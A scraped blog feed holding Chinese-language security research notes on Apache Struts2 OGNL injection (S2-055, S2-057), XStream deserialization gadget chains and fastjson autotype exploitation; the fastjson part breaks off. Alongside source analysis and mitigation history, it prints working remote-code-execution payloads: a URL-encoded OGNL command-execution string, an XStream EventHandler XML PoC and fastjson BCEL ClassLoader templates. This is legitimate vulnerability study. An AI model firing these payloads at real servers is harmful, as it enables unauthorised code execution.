去看了一下TemplateClassResolver.SAFER_RESOLVER)的官方文档， 12&gt; TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.&gt; 大致意思应该就是禁止了freemarker的RCE，具体我对freemarker不太了解，就不去误人子弟了。 修复直接参考https://www.freebuf.com/vuls/217482.html 18. S2-055影响范围：Struts 2.5 - Struts 2.5.14 S2-055漏洞原理跟S2-052一样，由jackson库处理json内容时产生的漏洞，这里默认不是用jackson处理json内容的，得在struts.xml配置 12&lt;bean type=\"org.apache.struts2.rest.handler.ContentTypeHandler\" name=\"jackson\" class=\"org.apache.struts2.rest.handler.JacksonLibHandler\"/&gt; &lt;constant name=\"struts.rest.handlerOverride.json\" value=\"jackson\"/&gt; 这里本身是因为jackson反序列化问题产生的，后面抽空分析一下这个jackson，这里不继续分析了 因为需要配置才可以打，所以这里的危害并没有想xstream一样严重 具体分析见http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/ 19. S2-057影响范围：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16 北京时间8月22日13时，Apache官方发布通告公布了Struts2中一个远程代码执行漏洞（CVE-2018-11776）。该漏洞在两种情况下存在，第一，在xml配置中未设置namespace值，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。第二，使用未设置 value和action值的url标签，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。 https://paper.seebug.org/682/ 这里一种配置方案是 没有配置namespace，访问s2057.action都会导向test.action，这里处理redirectAction的是 org.apache.struts2.dispatcher.ServletActionRedirectResult#execute ServletActionRedirectResult会将namespace一起拼接进location，比如/s2vuls/${1*2}/s2057.action,其namespace为/${1*2},actionName为跳转的test，最终location为/${1*2}/test.action。到这里我们就引入了OGNL表达式，看后续的一个处理 org.apache.struts2.dispatcher.StrutsResultSupport#execute 到这里，就开始熟悉起来了，就是S2-012的漏洞触发点 传入了TextParseUtil.translateVariables，到这里就结束了，后续将调用OGNL.getValue POC在2.3.x版本，可以直接用S2-045的poc打 1/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action 而对于2.5.x版本，我们需要好好分析一下 123456789101112131415$&#123;(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedClasses('')).(#ou.setExcludedPackageNames('')).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct.setMemberAccess(#dm)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; 从poc来看，从第7行开始都是我们熟悉的操作，那么前面多了那么多是在做什么？ 参考：https://paper.seebug.org/794/#35-struts-2516 在struts2 2.5.13版本之后，ognl库进行了更新，从3.1.12-&gt;3.1.15，其主要的一个变化是禁止访问context.map，OgnlContext的get、put、remove函数中都删除了对当前context的操作 此外，excluded相关的集合被设置为不可变，无法通过clear的方式来清除 针对上面两种的绕过 文章提出了这么一种思路: 没有办法使用context.map，可以调用attr，前文说过attr中保存着整个context的变量与方法，可以通过attr中的方法返回给我们一个context.map。 没有办法直接调用excludedClasses，也就不能使用clear方法来清空，但是还可以利用setter来把excludedClasses给设置成空 清空了黑名单，我们就可以利用DefaultMemberAccess来覆盖_memberAccess，来执行静态方法了。 而这里又会出现一个问题，当我们使用OgnlUtil的setExcludedClasses和setExcludedPackageNames将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说_memberAccess是源数据的一个引用，就像前文所说的，在每次createAction时都是通过setOgnlUtil利用全局的源数据创建一个引用，这个引用就是一个MemberAccess对象，也就是_memberAccess。所以这里只会影响这次请求的OgnlUtil而并未重新创建一个新的_memberAccess对象，所以旧的_memberAccess对象仍未改变。 而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的OgnlUitl作为源重新创建一个_memberAccess，这样在第二次请求中_memberAccess就是黑名单被置空的情况，这个时候就释放了DefaultMemberAccess，就可以进行正常的覆盖以及执行静态方法。 看过上面的分析后再来看poc，第二行获取了context，第3 4 5 6行清除了excluded相关的集合，但其当前的请求黑名单还是存在的，所以在2.5.x版本我们需要发送两次这个poc，第一次清楚黑名单，第二次覆盖_memberAccess并调用静态函数 0x03 总结 在分析过程中，参考了很多师傅们的笔记，这里特别感谢一下XD 从整个s2漏洞的历程来看，能看到很多漏洞其实利用点是相似的，只是说从哪个入口进去可能有所不同。这种漏洞的分析我认为用数据流分析是非常合适的。lgtm的师傅就用了他们的codeql发现了S2-057这个漏洞。 但是官方在一次次修复中，对于ognl表达式的执行限制的越来越多，使得如今就算出现ognl表达式注入也很难造成RCE的效果。 这里我们可以直接看lucifaer师傅的那篇文章 从时间线来看， struts2 2.3.14.1之前，ognl表达式执行没有什么障碍；2.3.14.1增加了SecurityMemberAccess，禁止静态函数执行allowStaticMethodAccess=false，在ognl表达式里面可以重新置为true；后续这个值被改成了final，无法被更改 struts2 2.3.20之前，虽然不能改allowStaticMethodAccess，但是可以通过构造函数的方式绕过；2.3.20之后，增加了黑名单 struts2 2.3.29之前，通过`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`这种方式初始化，清空黑名单；2.3.29之后，新增了黑名单，限制了这种方式的执行 struts2 2.3.34/2.5.16之前，通过container实例化ognlUtil，清空黑名单，详细见S2-045；之后禁止了context.map的访问和excludedClasses不可变，不能通过clear清楚 struts2 2.5.17之前，通过request中获取context，绕过context.map禁止访问的限制，详细见S2-057；之后新增了黑名单，完全禁止通过ognl的包来对stack做操作 后续几个版本也更新了很多安全措施，具体见lucifaer师傅的文章 在分析完struts2之后，也改变了对很有名的漏洞的感官，以前总觉得struts漏洞都是比较复杂的，但是现在想想有精彩复杂的地方也会有很傻的地方。 不能对还没有分析过的框架或者应用持有畏惧之心，共勉XD"},{"title":"【notes】回顾XStream反序列化漏洞","permalink":"http://blog.0kami.cn/2020/04/18/java/talk-about-xstream-deserialization/","text":"0x00 前言 XStream也是一款用的比较多的序列化组件，可以将object转化为XML并能完整的还原回来。他也曾经出现过反序列化漏洞，本文主要整理XStream相关的安全问题XD 0x01 基础知识 XStream的序列化和反序列化主要依靠toXML函数和fromXML函数，如下代码所示 1234567891011Person person = new Person(\"tom\", 18);XStream xStream = new XStream();String xml = xStream.toXML(person);// object to xmlSystem.out.println(xml);System.out.println(xStream.fromXML(xml)); // xml to object// 输出// &lt;objects.Person&gt;// &lt;name&gt;tom&lt;/name&gt;// &lt;age&gt;18&lt;/age&gt;// &lt;/objects.Person&gt;// objects.Person@369f73a2 关于XStream的fromXML分析看这篇文章，XStream会去调用不同的Converters来处理还原的过程。 XStream反序列化同fastjson这种不一样的地方是fastjson会在反序列化的时候主动去调用getters和setters，而XStream的反序列化过程中赋值都有Java的反射机制来完成，所以并没有这样主动调用的特性。 但是还有一种利用方式，回想一下，在几条常规的java反序列化利用链上，都利用了HashMap、PriorityQueue等对象（key不可重复等特性）会自动去调用hashCode、equal、compareTo等这种函数。 以这种想法来看XStream反序列化，当我们对Map这种类型的对象进行还原的时候，是否也同样会去调用上面提到的几种函数？接下来，看几个Converter的处理： 1. MapConverter来看看针对Map类型还原的Converter com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal populateMap函数会去处理后续的值，这里我们直接来看具体put的地方 com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap 这里target作为接收者，会调用Map的put函数，后续就是我们熟悉的对key调用hashCode函数 2. TreeSet/TreeMapConverter这里TreeSet和TreeMap一起讲，因为TreeSet本身就是一个只用上了Key的TreeMap；TreeSetConverter的反序列化处理也是先转化为TreeMapConverter的方式来优先还原TreeSet里的TreeMap，再填充到TreeSet里。 从TreeSetConverter来讲 从treeset中取出field treemap后，去进一步调用TreeMapConverter来还原TreeMap com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap 这里先用soredMap来填充需要还原的Entry，后续将调用TreeMap.putAll 最终会调用到java.util.AbstractMap#putAll 这里的put函数为TreeMap.put,不看具体的代码了，他的主要功能就是填充数据，并且在填充时将会比较当前存在key，如果是相同的key，则替换原有老的值。这个过程会去调用key的compareTo函数 3. DynamicProxyConverter还需要提及的是XStream还支持对动态代理的方式进行还原 这里的还原过程不说了，我们主要的关注点是使用Proxy动态代理，我们可以扩展前面两种的自动调用函数的攻击面，下一章会举EventHandler的例子 0x02 现有几种利用分析结合上面基础知识中提到的几个Converter，我们想要利用XStream反序列化漏洞的话，得去充分利用前面提到的几个会自动调用的函数 1. EventHandlerXStream反序列化用的最多的EventHandler，来看看他的invoke函数 主要实现在invokeInternal函数内 首先需要判断此时调用的函数是否为hashCode、equals、toString，如果是的话，采用以下的方式来处理。 但是我们需要利用的是invokeInternal函数后续的部分，所以我们利用的时候不能用它来调用上面的3个函数，意味着我前面提到的Map的方式，不适合用在这个地方；而TreeSet这种调用compareTo函数，可以用来继续往下走。 继续往下看 后续的就是经典的java反射机制来实现函数调用，并且这里的target和action都是可控的。 这里需要注意一个问题是，这里action函数参数是有要求的（看452行到461行） 无参数 单个参数，且参数的类型为Comparable，并且这个action函数是可利用的 第2种还没有找到这样可利用的函数，这里的第一种可以提两种： 配置好cmd的ProcessBuilder，action填start 配置好rmi url的JdbcRowSetImpl，action填getDatabaseMetaData，这里可以举一反三，主要思路就是可利用的getters 现在再来看看具体的POC 123456789101112131415&lt;sorted-set&gt; &lt;string&gt;foo&lt;/string&gt; &lt;dynamic-proxy&gt; &lt;!-- Proxy 动态代理，handler使用EventHandler --&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/System/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 2. Groovy ConvertedClosure利用条件：groovy &lt;= 2.4.3，在后续的版本里，MethodClosure不允许反序列化调用。 除了上面这种EventHandler的动态代理方式，Groovy的ConvertedClosure也同样可以达到这种效果 MethodClosure当前MethodClosure的主要作用就是封装我们需要执行的对象，比如 1new MethodClosure(Runtime.getRuntime(), \"exec\"); 封装Runtime对象，并设定后续需要调用的函数exec ConvertedClosure这个ConvertedClosure也是继承了InvocationHandler，可以在动态代理中作为handler的存在，来看一下他的invoke ConvertedClosure调用的是父类org.codehaus.groovy.runtime.ConversionHandler#invoke 主要看这个部分，对于当前调用的函数，如果非Object的函数(如toString、hashCode等)，并且不是GroovyObject的函数，会去调用子类的invokeCustom，这里看org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom 这里的属性都是可控的，也就意味着我们可以去调用去调用前面构造好的MethodClosure，这里后续调用call的过程可以看最近的这篇文章 所以为了满足能调用invokeCustom函数，前面的两种MapConverter和TreeSetConverter，选哪种呢？ 很明显答案是选择TreeSetConverter，因为Map会去调用hashCode，而TreeSet会去调用compareTo，这里的hashCode是Object的函数，过不了上面checkMethod，具体怎么写POC，不详细说了，见ysomap PS：这里需要提一下的是由于compareTo会带上一个参数，所以我们MethodClosure封装的后续需要调用的函数必须要存在一个String类型的参数，不然会找不到函数报错。（可能还有其他的解决方法，这里我没继续深入下去了，直接构造Runtime.exec可以解决这个问题） 3. Groovy Expando前面用到了TreeSet的方式，这里我们去使用Map的类型来触发。以Map的类型来触发，那就是找可以利用的hashCode函数 groovy.util.Expando#hashCode 如果在类属性expandoProperties中存在hashCode:methodclosure的内容，我们可以在这里直接调用MethodClosure的call函数，跟上面ConvertedClosure后续的调用一样，但是这里调用时没有函数参数过来，所以这里的思路是ProcessBuilder.start或者fastjson那种getters的利用，见POC 4. ImageIO$ContainsFilter上面使用动态代理的方式利用了TreeSet调用put时触发的compareTo，而这里利用的是HashMap类型put时调用的hashCode函数；这个链相对来说复杂一点，我们一点一点来说（参考marshalsec的ImageIO，这里先膜一波大佬的思路，后文为顺势讲下去的，主要目的是到达Iterator.next，实际挖掘这种链还是得从后往前找）： 从XStream处理Map类型时触发hashCode开始 关注jdk.nashorn.internal.objects.NativeString#hashCode 后续调用getStringValue函数，在这个函数里去调用了this.value.toString()，这里的value的类型为CharSequence，所以我们接下来要找可以利用的CharSequence的实现类，这里用到的是com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString函数 这里紧接着会去调用ByteArrayOutputStreamEx的readFrom，这个函数用到的主要是这边传入的InputStream的read函数 实际上is我们是可以控制的，因为这里调用的this.dataHandler.getDataSource().getInputStream()，他的值传递都可以用类属性的方式把他构建出来，分别是 123451. this.dataHandler == 构造好的DataHandler2. DataHandler的dataSource属性 == 构造好的XmlDataSource3. XmlDataSource调用getInputStream()函数返回构造好的inputStream// com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource 用这种方法就可以获取一个可控的inputStream，并且后续会去调用read函数 继续看下去，javax.crypto.CipherInputStream#read 此时需要构造一个Cipher类型，并且后续调用Cipher.update函数，这里可以用javax.crypto.NullCipher来填充，因为最终用到的是父类Cipher.update，只要不重载update，其他的子类也可以。 继续看Cipher.update 说了那么久，我们终于到了至关重要的一个地方，serviceIterator.next函数 后续我们将调用ImageIO下的javax.imageio.spi.FilterIterator#next advance函数会去调用filter.filter函数，而ImageIO存在一个有趣的filter javax.imageio.ImageIO.ContainsFilter#filter 我们可以指定一个Method对象去invoke，到了这里就是激动人心的Java反射机制了，我们提前构造好method对象，就可以调用任意的函数。 利用链比较长，整理一下过程 123456789XStream 处理Map类型 去调用jdk.nashorn.internal.objects.NativeString#hashCode com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString javax.activation.DataHandler#getDataSource com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream javax.crypto.CipherInputStream#read -&gt; getMoreData javax.crypto.NullCipher#update -&gt; chooseFirstProvider javax.imageio.spi.FilterIterator#next javax.imageio.ImageIO.ContainsFilter#filter ProcessBuilder#start 从后面往前看的话，我们前面做的所有操作都是为了能去触发Iterator.next，而这种Iterator的遍历处理，我们很容易再找到一处，下一节就是不用javax.imageio.ImageIO.ContainsFilter#filter来实现利用，请继续往下看XD 5. ServiceFinder$LazyIterator思路来自文章1、文章2) 先来看一下java.util.ServiceLoader.LazyIterator#next 当类属性acc为空时，会去调用nextService函数，而在该函数里面，我们看到了令人熟悉的Class.forName的调用。并且我们去实例化的classname、loader，都是类属性，属于我们可以控制的东西。 到了这里自然而然的就想到了使用BCEL的ClassLoader来载入classname里的字节码了(这里我在fastjson那篇里提到过)。 所以我们可以在ImageIO那条链的基础上，在触发Iterator.next时使用这个LazyIterator来代替 修改BCEL ClassLoader构造POC这里来提一下关于POC的构造，如果你使用了当前这个利用链，并且不对ClassLoader做处理的话，你会发现怎么都打不通，因为这里在实际还原ClassLoader的时候出现了错误 这里有两种解决方案，一是去除这种还原有问题的类（会很麻烦），二是直接把ClassLoader里的一些无关紧要的东西剔除掉。 这里我选择了第二种，经过调试去除了以下几个属性的值 这里由于我们剔除了ignored_packages和deferTo，导致BCEL的ClassLoader在载入普通的类的时候会出现加载错误的问题 来看看怎么解决这个问题 首先BCEL的ClassLoader.loadClass，一共尝试4次不同的载入方法 从当前ClassLoader的classes去找 对于默认忽略的包java./sun./javax.，使用deferTo去重新加载，这里的deferTo是系统的ClassLoader（ClassLoader.getSystemClassLoader()) 对于classname以$$BCEL$$开头的，根据classname的值去defineClass，这边就是我们最喜欢的任意载入字节码的地方 最后一次是用repository去载入当前的classname，如果这里还没找到，就会爆没有找到Class的错误 PS：这部分repository取的SyntheticRepository.getInstance()，还不是很清楚这个左右，后续整理一下ClassLoader相关的知识再做补充 再来看我们报错的原因，因为删除ignored_packages和deferTo之后，相当于第二种情况无法载入了，而显然java.lang.Object不符合第三种情况。最后第4种里面也没有找到这个java.lang.Object，所以最终爆了ClassNotFoundException 这里其实已经很明显了，解决这个问题，我们得在classes里添加我们传入的class字节码里所用到的所有类，那么在第一次尝试载入的时候，就找到了相应的类，无需尝试后续的几种载入方式。 比如这里我产生的字节码里面用上了Runtime，就得加上这个类 这里的Object必须加上，毕竟所有的对象都继承自Object 0x03 XStream的防御措施 XStream在1.4.7版本之后支持使用白名单和黑名单的方式来方式恶意类的反序列化security Starting with XStream 1.4.7, it is possible to define permissions for types, to check the type of an object that should be unmarshalled. Those permissions can be used to allow or deny types explicitly With these permissions it is at least not possible to inject unexpected types into an object graph. The security framework supports the setup of a black or white listing scenario. Any application should use this feature to limit the danger of arbitrary command execution if it deserializes data from an external source. XStream itself sets up a black list by default, i.e. it blocks all currently known critical classes of the Java runtime. Main reason for the black list is compatibility, because otherwise newer versions of XStream 1.4.x can no longer be used as drop-in replacement. Unfortunately this provides a false sense of security. Every XStream client should therefore switch to a white listing on its own as soon as possible. XStream itself will use white listing as default starting with 1.5.x and only clients that have also changed their setup will be able to use this newer version again as drop-in replacement. 这里主要看一下黑名单的处理 1.4.7-1.4.9EventHandler的处理由ReflectionConverter来处理的，在1.4.7-1.4.9版本，在canConvert处添加了对EventHandler的限制 所以EventHandler的POC就失效了，但是其他的几种并没有失效 &gt;=1.4.10在1.4.10版本增加了setupDefaultSecurity方式来设置默认的白名单，但是这个版本把上面EventHandler的限制去掉了，导致又可以使用最早的POC，需要注意的是这是没修补前的1.4.10，修复后已经不可以了 除了新增设置白名单的方式，也新增加了InternalBlackList这个converter，他设置的权限为LOW，而ReflectionConverter权限为Very_low，所以会先过一次黑名单检查（XStream在注册converters时，以权限的方式来决定次序）。 所以这里1,4,5都跪了，只剩下groovy这种了，当然肯定还有其他没有发现的利用链，所以最安全的方法还是使用白名单的方式，不能依赖XStream的黑名单来做安全防御。 0x04 总结 本文主要回顾了现有的一些利用链，值得注意的是： 如果XStream用的不是白名单模式，还是存在利用的可能性的。现有内置的黑名单只禁止了几个现有的利用链，我们还是可以找到其他可以利用的利用链的，比如前面提到的Groovy的利用链。 需要记住的是XStream他的触发方式依赖的是HashMap、TreeSet这种类型自动调用的hashCode、compareTo串起来的，后续可以注意一下这种可能的调用链。 PS：本文提到的所有POC，已经更新到GitHub上"},{"title":"【notes】浅谈fastjson反序列化漏洞","permalink":"http://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/","text":"0x00 前言最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。 0x01 基础知识 (1). fastjson的基础使用 fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。 先来看一个简单的例子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class Phone &#123; public String phoneNumber; public Phone() &#123; &#125; public Phone(String phoneNumber) &#123; this.phoneNumber = phoneNumber; &#125; @Override public String toString()&#123; return this.phoneNumber; &#125;&#125;public class NewPhone extends Phone &#123; public String location; public NewPhone()&#123; &#125; public NewPhone(String phoneNumber, String location) &#123; this.phoneNumber = phoneNumber; this.location = location; &#125; @Override public String toString()&#123; return this.phoneNumber+\":\"+this.location; &#125;&#125;public class Person &#123; public String name; public Phone phone; public Person() &#123; &#125; public Person(String name, Phone phone) &#123; this.name = name; this.phone = phone; &#125; @Override public String toString()&#123; return name+\":\"+phone; &#125;&#125; 上面包括了3个简单的对象Person、Phone以及NewPhone，我们用fastjson将Person对象转化成一个json字符串，并还原 123456789Phone phone = new Phone(\"1234567890\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output // &#123;\"name\":\"john\",\"phone\":&#123;\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890 调用fastjson的toJSONString可以轻易地将object转化为json字符串，也可以用parseObject将json字符串还原出来。但是这里有一个限制就是 123456789Phone phone = new NewPhone(\"1234567890\",\"China\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output// &#123;\"name\":\"john\",\"phone\":&#123;\"location\":\"China\",\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890 在上面的写法中，由于fastjson不知道需要还原的Person的Phone是本身还是子类NewPhone，面对这种多态方式，fastjson还原是父类，而不是子类NewPhone。这意味着我们丢失了Json字符串中phone的location字段。这显然是不可忍受的，所以fastjson给我们提供了指定还原类的字段@type方法 123456789Phone phone = new NewPhone(\"1234567890\",\"China\");Person person = new Person(\"john\", phone);String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);System.out.println(json);Person p = JSON.parseObject(json, Person.class);System.out.println(p);// output// &#123;\"@type\":\"org.vultest.base.Person\",\"name\":\"john\",\"phone\":&#123;\"@type\":\"org.vultest.base.NewPhone\",\"location\":\"China\",\"phoneNumber\":\"1234567890\"&#125;&#125;// john:1234567890:China 通过在toJSONString的时候指定SerializerFeature（SerializerFeature.WriteClassName），使得转化后的json字符串多了@type字段。这个字段指代了当前类的class，避免了上面的子类丢失字段的问题。比如上面直接指定了Person对象的phone属性的类是NewPhone，还原后成功打印出location。 到了这里，我们可以思考一下，如果@type被指定为某恶意的类，是否会导致任意代码执行的漏洞？ (2).fastjson的流程简介 这里直接参考https://paper.seebug.org/994/ 用一下廖大的流程图 具体的分析过程看上面的那篇文章即可，这里提一下将ASM动态生成的代码dump出来的方法 在分析过程中，ASM动态生成了相应的bytecodes，这里用idea的断点来dump源码 先将断点下在com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80 生成的bytecodes在code里，用执行表达式的功能，执行(new FileOutputStream(&quot;some.class&quot;)).write(code)即可生成 (3). fastjson 自动调用getter和setter类似Java的反序列化过程会自动调用readObject函数，fastjson还原对象时也会自动调用以下几个函数： 无参数的构造函数 符合条件的getter函数 符合条件的setter函数 这里需要区别的是fastjson所使用的parse函数和parseObject函数所调用的函数条件是不一样的。（ps：序列化时会调用所有getters） 1. parse 和 parseObject的区别来看一下parseObject函数 这里parseObject函数会首先调用JSON.parse函数，然后再去调用toJSON函数。 这里toJSON会把obj套一层JSONObject对象，他的实现方法是先new一个JSONObject，把obj对象给填充进去；然后调用toJSONString把生成的JSONObject转化为json字符串；最后再调用parse函数将这个json字符串给还原。 这里的toJSONString是我们序列化的一个过程，他会去调用这个对象的所有getters，也就意味着parseObject函数会主动去调getters和setters，而parse函数则会调用这个对象的setters和符合条件的getters(这部分见后文)。 那么也就意味着，parseObject比parse函数多了一个调用所有getters的利用点。 2. parse自动调用函数的主要逻辑接着我们来看一下JSON.parse函数自动调用getters和setters的逻辑。 先来看一下调用流程，以下分析fastjson版本1.2.24 com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialze（ps：这里很鸡贼的把deserialize的i给省略了） 首先是第570行调用了createInstance函数，该函数将会对当前还原的类进行实例化，这里会自动调用无参数的构造函数 其次是第600行调用了parseField函数，该函数将对每个类属性进行初始化(或递归生成新的对象) 跟进parseField函数 这里调用了com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseField函数，直接看关键点第83行，调用了setValue函数 setValue函数就是fastjson自动调用getter和setter的关键点 如果不存在相应的getter、setter、is函数，则利用反射机制将value赋值到当前的object上（这里就是else部分做的事情）。 而当fieldInfo存在函数时，如果同时存在getter和setter，则调用setter，如果只存在getter则调用getter。 这里我们关注一下fieldInfo的method是怎么填充的呢？这里要看com/alibaba/fastjson/util/JavaBeanInfo.java#build函数，ParserConfig在createJavaBeanDeserializer函数中会调用JavaBeanInfo.build函数，以此填充fieldInfo，也就是我们需要分析的几个method。 不看具体的代码，写一下筛选的条件： setter提取条件： 函数名长度大于等于4 非静态函数 限制返回类型为void或当前类 函数参数只有一个 函数名以set开头，第四个字符是大写或者unicde或者_或者字母f；如果函数名长度&gt;=5，看第5位字符是不是大写的 getter提取条件： 函数名长度大于等于4 非静态函数 函数名以get开头，第四个字符大写 函数参数为0个 函数的返回类型为Collection的子类或本身、Map的子类或本身、AtomicBoolean、AtomicInteger、AtomicLong 无相对应的setter函数 经过上述的两个条件提取后，保留了符合条件的getter和setter，并于com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue函数中invoke调用，也就是说实现了类似反序列化过程中主动调用readObject函数的效果。 知道了上述的条件，其实我们可以利用传入某字段的方式来主动调用相关符合条件的setter和getter。例如在Person里面添加一个setTest函数，并在需要转化的json中添加&quot;test&quot;:1，将会主动调用setTest。 我们在利用@type构造有危害的利用链时，主要就是查找有危害的无参数的构造函数、符合条件的getter和setter。 3. 突破parse不能调用所有getters的限制这里的突破思路主要有两个： tomcat bcel的poc threedream师傅发现的引用的方式 第一种：Tomcat BCEL POC思路这个poc巧妙的利用了JSONObject.toString函数，先来看看这个toString 这个toString继承自JSON 这里他直接调用了toJSONString函数 看到后续他将当前这个JSONObject实例进行了obj to str的操作，也就是我们使用静态函数JSON.toJSONString来序列化数据一样，这里将会调用当前这个类的所有符合条件的getters（这里的条件比调用parse时宽松，他对返回类型无限制）。 那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了 com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject 这里有一处如果当前object为JSONObject类型时，将会对当前的这个key调用toString函数。这里在处理过程中，我们可以知道如果遇到{，fastjson会加一层JSONObject。 那么，我们只需要构造一个类似 1&#123;&#123;some&#125;:x&#125; 这种方式，此时的key为{}(也就是下一层的JSONObject)，value为x。我们就可以使得fastjson去调用key.toString函数，这个toString的过程也就是将key调用toJSONString的过程，意味着将会调用当前key对象的所有getters。到这里我们就可以使parse函数拥有与parseObject一样的执行效果，以下面的poc为例。 123456789&#123;// 第一层JSONObject，他的key为另外一个JSONObject &#123;// 下一层JSONObject，他的内容将会调用toJSONString \"x\":&#123;// 具体触发点为getConnection \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\", \"driverClassLoader\": &#123;\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;, \"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\" &#125; &#125;:\"x\"&#125;; 第二种：$ref点当fastjson版本&gt;=1.2.36时，我们可以使用$ref的方式来调用任意的getter 以1.2.48版本为例，首先看一下遇到$ref是怎么处理的 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388 当遇到引用$ref这种方式，会增加一个resolveTask，留在parse结束后进行处理 com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask 调用JSONPath.eval，关于JSONPath的介绍 这里的eval函数最终会去调用JSONPath.getPropertyValue函数（这里其实是可以根据我们传入的内容去调用不同的Segement，比如这里用了$.value的方式使用的是PropertySegement） 后续就不详细分析了，这里如果存在相应的getter，就会去invoke这个函数；如果没有，那么就会用反射机制去获取属性的值。 这里举个例子 123456json = \"&#123;\" + \"\\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\" + \"\\\"driverClassLoader\\\": &#123;\\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"&#125;,\" + \"\\\"driverClassName\\\": \\\"$$BCEL$$$l$8b$I$A$...\\\",\" + \"\\\"connection\\\":&#123;\\\"$ref\\\": \\\"$.connection\\\"&#125;\"+ \"&#125;\"; 会去调用getConnection函数，这里也突破了parse到parseObject的效果 (4). private属性还有一点需要注意的是默认fastjon在转化时，如果没有setter函数，而是以反射机制来赋值的情况，会忽略private属性的转化。意味着如果我们在构造过程中，填充进去的属性是private的且没有setter，那么在转化过程中是不会被填入还原后的对象的。如果需要对private属性进行转化，那么需要设置Feature.SupportNonPublicField 0x02 EXP分析 相比于Java反序列化利用链构造的复杂性，fastjson利用链主要是寻找可利用的getter、setter等，常见的几种POC如下文所示： (1). 